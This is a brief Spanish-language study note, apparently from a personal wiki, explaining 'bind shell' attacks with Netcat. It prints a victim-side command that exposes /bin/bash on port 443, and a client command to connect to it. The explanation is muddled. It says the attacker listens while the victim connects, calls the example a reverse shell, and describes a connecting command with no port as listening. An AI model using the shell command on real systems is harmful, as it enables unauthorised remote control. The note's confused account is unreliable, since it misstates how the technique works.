Una "bind shell" es otra técnica utilizada en el ámbito de la ciberseguridad y la piratería informática. A diferencia de la "[[Reverse Shell]]", donde la víctima inicia la conexión hacia el atacante, en una "bind shell" es el atacante quien escucha en un puerto específico y espera a que la víctima se conecte a él.

En una "bind shell", un código malicioso se ejecuta en un sistema comprometido y espera activamente por una conexión entrante desde un dispositivo controlado por el atacante. Una vez que la víctima establece la conexión con el atacante, este último obtiene un control remoto sobre el sistema comprometido, pudiendo enviar comandos al mismo y recibir respuestas.

En el siguiente ejemplo se muestra (con [[Netcat]] la forma de una reverse shell)

**Máquina victima**

Una vez se tenga acceso a la máquina víctima se ingresa el siguiente comando para ponerse en escucha y que la persona que se conecte pueda tener una consola:

```ncat -nlvp 443 -e /bin/bash```

**Máquina del atacante**

Primero el atacante se pone en escucha con el siguiente comando en un [[puerto]] en específico.

```nc 198.168.0.1```

